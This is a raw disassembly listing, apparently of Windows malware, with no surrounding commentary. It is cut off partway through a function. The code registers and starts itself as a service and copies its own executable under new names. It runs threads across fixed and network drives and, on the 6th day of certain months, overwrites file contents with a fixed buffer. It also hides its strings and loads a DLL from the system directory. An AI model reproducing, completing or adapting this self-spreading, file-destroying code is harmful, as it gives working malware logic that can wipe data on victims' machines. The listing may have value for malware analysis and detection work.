loc_40695D:				; CODE XREF: sub_40686A+ECj
		push	ebp		; hLibModule
		call	ds:FreeLibrary

loc_406964:				; CODE XREF: sub_40686A+B3j
		cmp	[esp+10h], ebx
		jnz	short loc_40696E
		xor	eax, eax
		jmp	short loc_4069E3
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40696E:				; CODE XREF: sub_40686A+FEj
		cmp	dword_491EF8, ebx
		jz	short loc_406981
		push	ebx
		push	esi
		call	sub_4046D7
		pop	ecx
		pop	ecx
		jmp	short loc_4069E0
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_406981:				; CODE XREF: sub_40686A+10Aj
		cmp	dword_491F00, ebx
		jnz	short loc_4069E0
		mov	ebp, ds:OpenSCManagerA ; Establish a connection	to the service
					; control manager on the specified computer
					; and opens the	specified database
		push	2		; dwDesiredAccess
		push	ebx		; lpDatabaseName
		push	ebx		; lpMachineName
		call	ebp ; OpenSCManagerA ; Establish a connection to the service
					; control manager on the specified computer
					; and opens the	specified database
		push	ebx		; lpPassword
		push	ebx		; lpServiceStartName
		push	ebx		; lpDependencies
		push	ebx		; lpdwTagId
		push	ebx		; lpLoadOrderGroup
		push	esi		; lpBinaryPathName
		push	ebx		; dwErrorControl
		push	2		; dwStartType
		push	110h		; dwServiceType
		push	ebx		; dwDesiredAccess
		push	edi		; lpDisplayName
		push	edi		; lpServiceName
		push	eax		; hSCManager
		mov	[esp+44h], eax
		call	ds:CreateServiceA
		push	dword ptr [esp+10h] ; hSCObject
		mov	esi, ds:CloseServiceHandle
		call	esi ; CloseServiceHandle
		push	1		; dwDesiredAccess
		push	ebx		; lpDatabaseName
		push	ebx		; lpMachineName
		call	ebp ; OpenSCManagerA ; Establish a connection to the service
					; control manager on the specified computer
					; and opens the	specified database
		mov	ebp, eax
		push	10h		; dwDesiredAccess
		push	edi		; lpServiceName
		push	ebp		; hSCManager
		call	ds:OpenServiceA
		mov	edi, eax
		push	ebx		; lpServiceArgVectors
		push	ebx		; dwNumServiceArgs
		push	edi		; hService
		call	ds:StartServiceA
		push	edi		; hSCObject
		call	esi ; CloseServiceHandle
		push	ebp		; hSCObject
		call	esi ; CloseServiceHandle

loc_4069E0:				; CODE XREF: sub_40686A+115j
					; sub_40686A+11Dj
		push	1
		pop	eax

loc_4069E3:				; CODE XREF: sub_40686A+102j
		pop	edi
		pop	esi
		pop	ebp
		pop	ebx
		add	esp, 2034h
		retn
sub_40686A	endp ; sp =  202Ch


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

; DWORD	__stdcall sub_4069EE(LPVOID)
sub_4069EE	proc near		; DATA XREF: sub_406F66+71o

RootPathName	= byte ptr -4
arg_0		= byte ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	eax, dword_4110F4
		mov	dword ptr [ebp+RootPathName], eax
		mov	al, [ebp+arg_0]
		add	[ebp+RootPathName], al
		lea	eax, [ebp+RootPathName]
		push	eax		; lpRootPathName
		call	ds:GetDriveTypeA
		cmp	eax, 3
		jz	short loc_406A1B
		cmp	eax, 4
		jz	short loc_406A1B
		push	1
		pop	eax
		leave
		retn	4
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_406A1B:				; CODE XREF: sub_4069EE+1Fj
					; sub_4069EE+24j ...
		push	0
		lea	eax, [ebp+RootPathName]
		push	offset sub_405A58
		push	eax
		call	sub_403E11
		add	esp, 0Ch
		push	1B77400h	; dwMilliseconds
		call	ds:Sleep
		jmp	short loc_406A1B
sub_4069EE	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

; DWORD	__stdcall sub_406A3B(LPVOID)
sub_406A3B	proc near		; DATA XREF: sub_406F66+60o

var_258		= dword	ptr -258h
var_12C		= byte ptr -12Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 258h
		push	esi
		mov	esi, offset aTW@WT@Y@WwYteW ; "ÇÙ]TÕŞWÜ@ÈÚßWÙ×Ù]T@ÅÚY\\ÙÕ×@ÏÔWWÜYTEÜW×Ú"...
		lea	eax, [ebp+var_12C]
		push	esi		; char *
		push	eax		; char *
		call	_strcpy
		push	7
		push	esi
		call	sub_403434
		push	eax		; char *
		lea	eax, [ebp+var_12C]
		push	eax		; char *
		call	_strcat
		and	byte ptr [ebp+var_258],	0
		lea	eax, [ebp+var_258]
		push	12Ch
		push	eax
		lea	eax, [ebp+var_12C]
		push	(offset	aYYTyXxnYtWyTTY+28h)
		push	eax
		push	80000002h
		call	sub_4044E4
		push	0
		lea	eax, [ebp+var_258]
		push	offset sub_405A58
		push	eax
		call	sub_403E11
		add	esp, 38h
		xor	eax, eax
		pop	esi
		leave
		retn	4
sub_406A3B	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_406AB2	proc near		; CODE XREF: sub_405A58+153p
					; sub_406498+220p ...

var_2250	= dword	ptr -2250h
var_2240	= dword	ptr -2240h
var_122C	= byte ptr -122Ch
ExistingFileName= byte ptr -314h
var_210		= byte ptr -210h
FileName	= byte ptr -10Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		mov	eax, 2240h
		call	__alloca_probe
		mov	eax, [ebp+arg_8]
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		xor	ebx, ebx
		push	edi
		cmp	[ebp+arg_C], ebx
		mov	[ebp+var_4], esi
		mov	[ebp+var_8], eax
		jnz	short loc_406AE6
		push	[ebp+arg_0]
		call	sub_40471A
		test	eax, eax
		pop	ecx
		jnz	loc_406C24

loc_406AE6:				; CODE XREF: sub_406AB2+21j
		mov	edi, offset unk_40FD50
		push	ebx
		push	edi
		call	sub_403464
		pop	ecx
		cmp	esi, ebx
		pop	ecx
		mov	[ebp+arg_4], eax
		jge	short loc_406B0A
		push	ebx
		call	sub_4046AB
		xor	edx, edx
		pop	ecx
		div	[ebp+arg_4]
		mov	[ebp+var_4], edx

loc_406B0A:				; CODE XREF: sub_406AB2+47j
		mov	esi, offset aYRNyWnyvNy_Tnn ; "yÜRÜny×ßWnyVÚ]ny_ŞTnnnnnnnnnnnnnyTRTnyZ"...
		push	ebx
		push	esi
		call	sub_403464
		cmp	[ebp+arg_8], ebx
		pop	ecx
		pop	ecx
		mov	[ebp+arg_4], eax
		jge	short loc_406B2F
		push	ebx
		call	sub_4046AB
		xor	edx, edx
		pop	ecx
		div	[ebp+arg_4]
		mov	[ebp+var_8], edx

loc_406B2F:				; CODE XREF: sub_406AB2+6Cj
		lea	eax, [ebp+FileName]
		push	eax		; nSize
		call	sub_403D8C
		lea	eax, [ebp+ExistingFileName]
		mov	[esp+2250h+var_2250], 104h
		push	eax		; lpFilename
		push	ebx		; hModule
		call	ds:GetModuleFileNameA
		lea	eax, [ebp+FileName]
		push	ebx		; bFailIfExists
		push	eax		; lpNewFileName
		lea	eax, [ebp+ExistingFileName]
		push	eax		; lpExistingFileName
		call	ds:CopyFileA
		test	eax, eax
		jz	loc_406C24
		lea	eax, [ebp+FileName]
		push	20h		; dwFileAttributes
		push	eax		; lpFileName
		call	ds:SetFileAttributesA
		push	1F2Ah		; size_t
		lea	eax, [ebp+var_2240]
		push	offset aI	; void *
		push	eax		; void *
		call	_memcpy
		lea	eax, [ebp+var_2240]
		mov	[ebp+var_122C],	bl
		push	eax
		lea	eax, [ebp+FileName]
		push	eax
		call	sub_4054EF
		push	ebx
		call	sub_4046AB
		xor	edx, edx
		mov	ecx, 2800h
		div	ecx
		lea	eax, [ebp+FileName]
		add	edx, 13200h
		push	edx
		push	eax
		call	sub_403F63
		push	[ebp+var_4]
		push	edi
		call	sub_403434
		push	eax		; char *
		lea	eax, [ebp+var_210]
		push	eax		; char *
		call	_strcpy
		push	[ebp+var_8]
		push	esi
		call	sub_403434
		push	eax		; char *
		lea	eax, [ebp+var_210]
		push	eax		; char *
		call	_strcat
		add	esp, 40h
		lea	eax, [ebp+var_210]
		push	[ebp+arg_C]
		push	eax
		lea	eax, [ebp+FileName]
		push	eax
		push	[ebp+arg_0]
		call	sub_4050FD
		lea	eax, [ebp+FileName]
		push	eax
		call	sub_403DFA
		add	esp, 14h

loc_406C24:				; CODE XREF: sub_406AB2+2Ej
					; sub_406AB2+B5j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_406AB2	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_406C29	proc near		; DATA XREF: StartAddress+32o

var_11C		= byte ptr -11Ch
var_18		= dword	ptr -18h
var_8		= dword	ptr -8
NumberOfBytesWritten= dword ptr	-4
hObject		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 11Ch
		push	ebx
		push	esi
		push	edi
		lea	ecx, [ebp+var_18]
		call	sub_40174B
		xor	edi, edi
		cmp	[ebp+arg_4], edi
		jnz	loc_406D5E
		push	edi		; dwMilliseconds
		call	ds:Sleep
		cmp	dword_491F04, edi
		jnz	short loc_406CB0
		mov	esi, (offset aYRNyWnyvNy_Tnn+20h)
		push	edi
		push	esi
		call	sub_403464
		mov	[ebp+arg_4], eax
		lea	eax, [ebp+var_11C]
		push	eax		; char *
		push	edi		; char *
		push	edi		; char *
		push	edi		; char *
		push	[ebp+hObject]	; char *
		call	__splitpath
		add	esp, 1Ch
		xor	ebx, ebx
		cmp	[ebp+arg_4], edi
		jle	loc_406D5E

loc_406C86:				; CODE XREF: sub_406C29+7Cj
		push	ebx
		push	esi
		call	sub_403434
		push	eax
		lea	eax, [ebp+var_11C]
		push	eax
		call	unknown_libname_9 ; Microsoft VisualC 2-7/net runtime
		add	esp, 10h
		test	eax, eax
		jz	short loc_406CA7
		inc	ebx
		cmp	ebx, [ebp+arg_4]
		jl	short loc_406C86

loc_406CA7:				; CODE XREF: sub_406C29+76j
		cmp	ebx, [ebp+arg_4]
		jge	loc_406D5E

loc_406CB0:				; CODE XREF: sub_406C29+2Cj
		push	20h		; dwFileAttributes
		push	[ebp+hObject]	; lpFileName
		call	ds:SetFileAttributesA
		push	edi		; hTemplateFile
		push	20h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	edi		; lpSecurityAttributes
		push	1		; dwShareMode
		push	0C0000000h	; dwDesiredAccess
		push	[ebp+hObject]	; lpFileName
		call	ds:CreateFileA
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+hObject], eax
		jz	loc_406D5E
		lea	ecx, [ebp+NumberOfBytesWritten]
		push	ecx		; lpFileSizeHigh
		push	eax		; hFile
		call	ds:GetFileSize
		cmp	[ebp+NumberOfBytesWritten], edi
		mov	ebx, eax
		mov	[ebp+var_8], ebx
		jz	short loc_406CF9
		mov	ebx, 2000h
		jmp	short loc_406CFC
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_406CF9:				; CODE XREF: sub_406C29+C7j
		shr	ebx, 13h

loc_406CFC:				; CODE XREF: sub_406C29+CEj
		push	64h		; size_t
		mov	esi, offset Buffer
		push	ebx		; int
		push	esi		; void *
		call	_memset
		add	esp, 0Ch
		push	edi		; dwMoveMethod
		push	edi		; lpDistanceToMoveHigh
		push	edi		; lDistanceToMove
		push	[ebp+hObject]	; hFile
		call	ds:SetFilePointer
		cmp	ebx, edi
		jle	short loc_406D39
		mov	[ebp+arg_4], ebx

loc_406D20:				; CODE XREF: sub_406C29+10Ej
		lea	eax, [ebp+NumberOfBytesWritten]
		push	edi		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		push	80000h		; nNumberOfBytesToWrite
		push	esi		; lpBuffer
		push	[ebp+hObject]	; hFile
		call	ds:WriteFile
		dec	[ebp+arg_4]
		jnz	short loc_406D20

loc_406D39:				; CODE XREF: sub_406C29+F2j
		mov	eax, [ebp+var_8]
		shl	ebx, 13h
		cmp	ebx, eax
		jnb	short loc_406D55
		lea	ecx, [ebp+NumberOfBytesWritten]
		push	edi		; lpOverlapped
		sub	eax, ebx
		push	ecx		; lpNumberOfBytesWritten
		push	eax		; nNumberOfBytesToWrite
		push	esi		; lpBuffer
		push	[ebp+hObject]	; hFile
		call	ds:WriteFile

loc_406D55:				; CODE XREF: sub_406C29+118j
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle

loc_406D5E:				; CODE XREF: sub_406C29+19j
					; sub_406C29+57j ...
		push	1
		pop	eax
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_406C29	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

; DWORD	__stdcall StartAddress(LPVOID)
StartAddress	proc near		; DATA XREF: sub_406DBF+5Fo

RootPathName	= byte ptr -4
arg_0		= byte ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	eax, dword_4110F4
		mov	dword ptr [ebp+RootPathName], eax
		mov	al, [ebp+arg_0]
		add	[ebp+RootPathName], al
		lea	eax, [ebp+RootPathName]
		push	eax		; lpRootPathName
		call	ds:GetDriveTypeA
		cmp	eax, 3
		jz	short loc_406D93
		cmp	eax, 4
		jz	short loc_406D93
		push	1
		pop	eax
		leave
		retn	4
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_406D93:				; CODE XREF: StartAddress+1Fj
					; StartAddress+24j ...
		push	0
		lea	eax, [ebp+RootPathName]
		push	offset sub_406C29
		push	eax
		call	sub_403E11
		add	esp, 0Ch
		jmp	short loc_406D93
StartAddress	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_406DA8	proc near		; CODE XREF: sub_406DBF+7Bp
		push	esi
		push	1
		pop	esi

loc_406DAC:				; CODE XREF: sub_406DA8+13j
		push	1
		push	esi
		call	sub_4013FA
		inc	esi
		cmp	esi, 0BB8h
		jl	short loc_406DAC
		pop	esi
		retn
sub_406DA8	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_406DBF	proc near		; CODE XREF: sub_406F66+80p

SystemTime	= _SYSTEMTIME ptr -14h
ThreadId	= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	ebx
		push	esi
		push	edi
		mov	edi, ds:Sleep
		push	1
		pop	ebx

loc_406DD1:				; CODE XREF: sub_406DBF+29j
					; sub_406DBF+30j ...
		push	927C0h		; dwMilliseconds
		call	edi ; Sleep
		lea	eax, [ebp+SystemTime]
		push	eax		; lpSystemTime
		call	ds:GetLocalTime
		mov	ax, [ebp+SystemTime.wMonth]
		test	bl, al
		jz	short loc_406DD1
		cmp	[ebp+SystemTime.wDay], 6
		jnz	short loc_406DD1
		and	dword_491F04, 0
		cmp	ax, 7
		mov	dword_491F08, ebx
		jnz	short loc_406E0A
		mov	dword_491F04, ebx

loc_406E0A:				; CODE XREF: sub_406DBF+43j
		cmp	ax, bx
		jnz	short loc_406E15
		mov	dword_491F04, ebx

loc_406E15:				; CODE XREF: sub_406DBF+4Ej
		xor	esi, esi

loc_406E17:				; CODE XREF: sub_406DBF+72j
		lea	eax, [ebp+ThreadId]
		push	eax		; lpThreadId
		push	0		; dwCreationFlags
		push	esi		; lpParameter
		push	offset StartAddress ; lpStartAddress
		push	0		; dwStackSize
		push	0		; lpThreadAttributes
		call	ds:CreateThread
		inc	esi
		cmp	esi, 1Ah
		jl	short loc_406E17
		push	1B7740h		; dwMilliseconds
		call	edi ; Sleep
		call	sub_406DA8
		push	0FFFFFFFFh	; dwMilliseconds
		call	edi ; Sleep
		jmp	short loc_406DD1
sub_406DBF	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

; DWORD	__stdcall sub_406E45(LPVOID)
sub_406E45	proc near		; DATA XREF: sub_406F66+51o

LibFileName	= byte ptr -114h
var_10		= dword	ptr -10h
var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 114h
		lea	eax, [ebp+LibFileName]
		push	esi
		push	eax
		call	sub_403D8C
		lea	eax, [ebp+var_10]
		push	eax
		push	1101h
		push	offset unk_40FFF0
		call	sub_4071E0
		push	[ebp+var_10]
		push	eax
		lea	eax, [ebp+LibFileName]
		push	eax
		call	sub_403CBB
		lea	eax, [ebp+LibFileName]
		push	0
		push	eax
		call	sub_4046D7
		lea	eax, [ebp+LibFileName]
		xor	esi, esi
		push	eax
		call	sub_403DFA
		add	esp, 28h

loc_406E9D:				; CODE XREF: sub_406E45+79j
		test	eax, eax
		jnz	short loc_406EC0
		push	64h		; dwMilliseconds
		call	ds:Sleep
		mov	eax, esi
		inc	esi
		cmp	eax, 64h
		jg	short loc_406EC0
		lea	eax, [ebp+LibFileName]
		push	eax
		call	sub_403DFA
		pop	ecx
		jmp	short loc_406E9D
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_406EC0:				; CODE XREF: sub_406E45+5Aj
					; sub_406E45+6Aj
		push	0Ah		; size_t
		lea	eax, [ebp+var_C]
		push	0		; int
		push	eax		; void *
		call	_memset
		add	esp, 0Ch
		lea	eax, [ebp+LibFileName]
		mov	[ebp+var_C], 77h
		mov	byte ptr [ebp-0Bh], 71h
		push	104h		; uSize
		push	eax		; lpBuffer
		mov	byte ptr [ebp-0Ah], 6Bh
		call	ds:GetSystemDirectoryA
		lea	eax, [ebp+LibFileName]
		push	offset asc_40E044 ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_C]
		push	eax		; char *
		lea	eax, [ebp+LibFileName]
		push	eax		; char *
		call	_strcat
		add	esp, 10h
		cmp	dword_491EF8, 0
		pop	esi
		jz	short loc_406F40
		lea	eax, [ebp+LibFileName]
		push	offset aYRNyWnyvNy_Tnn ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+LibFileName]
		push	0
		push	eax
		call	sub_4046D7
		add	esp, 10h
		jmp	short loc_406F60
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_406F40:				; CODE XREF: sub_406E45+D5j
		lea	eax, [ebp+LibFileName]
		push	offset a_dll	; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		lea	eax, [ebp+LibFileName]
		pop	ecx
		push	eax		; lpLibFileName
		call	ds:LoadLibraryA

loc_406F60:				; CODE XREF: sub_406E45+F9j
		xor	eax, eax
		leave
		retn	4
sub_406E45	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_406F66	proc near		; CODE XREF: sub_406FF0+3Ep
					; WinMain(x,x,x,x)+70p

ThreadId	= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		mov	esi, ds:CreateThread
		push	edi
		lea	eax, [ebp+ThreadId]
		xor	edi, edi
		push	eax		; lpThreadId
		push	edi		; dwCreationFlags
		push	edi		; lpParameter
		push	offset sub_4015FF ; lpStartAddress
		push	edi		; dwStackSize
		push	edi		; lpThreadAttributes
		call	esi ; CreateThread
		lea	eax, [ebp+ThreadId]
		push	eax		; lpThreadId
		push	edi		; dwCreationFlags
		push	edi		; lpParameter
		push	offset sub_4060CD ; lpStartAddress
		push	edi		; dwStackSize
		push	edi		; lpThreadAttributes
		call	esi ; CreateThread
		lea	eax, [ebp+ThreadId]
		push	eax		; lpThreadId
		push	edi		; dwCreationFlags
		push	edi		; lpParameter
		push	offset sub_40684B ; lpStartAddress
		push	edi		; dwStackSize
		push	edi		; lpThreadAttributes
		call	esi ; CreateThread
		lea	eax, [ebp+ThreadId]
		push	eax		; lpThreadId
		push	edi		; dwCreationFlags
		push	edi		; lpParameter
		push	offset sub_405E44 ; lpStartAddress
		push	edi		; dwStackSize
		push	edi		; lpThreadAttributes
		call	esi ; CreateThread
		lea	eax, [ebp+ThreadId]
		push	eax		; lpThreadId
		push	edi		; dwCreationFlags
		push	edi		; lpParameter
		push	offset sub_406E45 ; lpStartAddress
		push	edi		; dwStackSize
		push	edi		; lpThreadAttributes
		call	esi ; CreateThread
		lea	eax, [ebp+ThreadId]
		push	eax		; lpThreadId
		push	edi		; dwCreationFlags
		push	edi		; lpParameter
		push	offset sub_406A3B ; lpStartAddress
		push	edi		; dwStackSize
		push	edi		; lpThreadAttributes
		call	esi ; CreateThread
		xor	ebx, ebx

loc_406FD1:				; CODE XREF: sub_406F66+7Ej
		lea	eax, [ebp+ThreadId]
		push	eax		; lpThreadId
		push	edi		; dwCreationFlags
		push	ebx		; lpParameter
		push	offset sub_4069EE ; lpStartAddress
		push	edi		; dwStackSize
		push	edi		; lpThreadAttributes
		call	esi ; CreateThread
		inc	ebx
		cmp	ebx, 1Ah
		jl	short loc_406FD1
		call	sub_406DBF
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_406F66	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_406FF0	proc near		; CODE XREF: .text:0040704Ep
					; DATA XREF: .text:loc_407037o

ServiceStatus	= _SERVICE_STATUS ptr -1Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 1Ch
		xor	eax, eax
		mov	[ebp+ServiceStatus.dwServiceType], 110h
		mov	[ebp+ServiceStatus.dwControlsAccepted],	eax
		mov	[ebp+ServiceStatus.dwWin32ExitCode], eax
		mov	[ebp+ServiceStatus.dwServiceSpecificExitCode], eax
		mov	[ebp+ServiceStatus.dwCheckPoint], eax
		mov	[ebp+ServiceStatus.dwWaitHint],	eax
		lea	eax, [ebp+ServiceStatus]
		push	eax		; lpServiceStatus
		mov	[ebp+ServiceStatus.dwCurrentState], 4
		push	hServiceStatus	; hServiceStatus
		call	ds:SetServiceStatus
		call	sub_404B20
		test	eax, eax
		jz	short locret_407033
		call	sub_406F66

locret_407033:				; CODE XREF: sub_406FF0+3Cj
		leave
		retn	4
sub_406FF0	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_407037:				; DATA XREF: WinMain(x,x,x,x)+5Ao
		push	offset sub_406FF0
		push	offset unk_4919E4
		call	ds:RegisterServiceCtrlHandlerA
		push	0
		mov	hServiceStatus,	eax
		call	sub_406FF0
		retn	8

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

; __stdcall WinMain(x,x,x,x)
_WinMain@16	proc near		; CODE XREF: start+C9p

WSAData		= WSAData ptr -1A0h
ServiceStartTable= SERVICE_TABLE_ENTRYA	ptr -10h
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 1A0h
		lea	eax, [ebp+WSAData]
		push	eax		; lpWSAData
		push	2		; wVersionRequested
		call	ds:WSAStartup
		call	sub_4053E8
		test	eax, eax
		jz	short loc_4070CB
		call	sub_40686A
		cmp	byte_40F0D4, 0
		jz	short loc_407094
		push	offset byte_40F0D4
		call	sub_4058ED
		test	eax, eax
		pop	ecx
		jnz	short loc_4070CB

loc_407094:				; CODE XREF: WinMain(x,x,x,x)+2Dj
		cmp	dword_491F00, 0
		jz	short loc_4070BD
		and	[ebp+var_8], 0
		and	[ebp+var_4], 0
		lea	eax, [ebp+ServiceStartTable]
		mov	[ebp+ServiceStartTable.lpServiceName], offset unk_4919E4
		push	eax		; lpServiceStartTable
		mov	[ebp+ServiceStartTable.lpServiceProc], offset loc_407037
		call	ds:StartServiceCtrlDispatcherA

loc_4070BD:				; CODE XREF: WinMain(x,x,x,x)+45j
		call	sub_404B20
		test	eax, eax
		jz	short loc_4070CB
		call	sub_406F66

loc_4070CB:				; CODE XREF: WinMain(x,x,x,x)+1Fj
					; WinMain(x,x,x,x)+3Cj	...
		xor	eax, eax
		leave
		retn	10h
_WinMain@16	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4070D1	proc near		; CODE XREF: sub_40565D+1CCp

var_1388C	= dword	ptr -1388Ch
var_13888	= dword	ptr -13888h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		mov	eax, 1388Ch
		call	__alloca_probe
		push	ebx
		push	esi
		push	[ebp+arg_4]
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ebx, eax
		xor	esi, esi
		cmp	ebx, esi
		pop	ecx
		mov	[ebp+var_C], ebx
		mov	[ebp+var_8], esi
		mov	[ebp+var_4], esi
		jnz	short loc_407101
		xor	eax, eax
		jmp	loc_4071DC
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_407101:				; CODE XREF: sub_4070D1+27j
		push	edi
		push	13880h		; size_t
		lea	eax, [ebp+var_1388C]
		push	esi		; int
		push	eax		; void *
		call	_memset
		add	esp, 0Ch
		xor	eax, eax
		lea	edi, [ebp+var_13888]

loc_40711F:				; CODE XREF: sub_4070D1+8Bj
					; sub_4070D1+B0j
		cmp	eax, [ebp+arg_4]
		jnb	short loc_40718A

loc_407124:				; CODE XREF: sub_4070D1+68j
		mov	ecx, [ebp+arg_0]
		mov	cl, [eax+ecx]
		test	cl, cl
		jz	short loc_40713B
		mov	[esi+ebx], cl
		inc	esi
		inc	eax
		mov	[ebp+var_4], esi
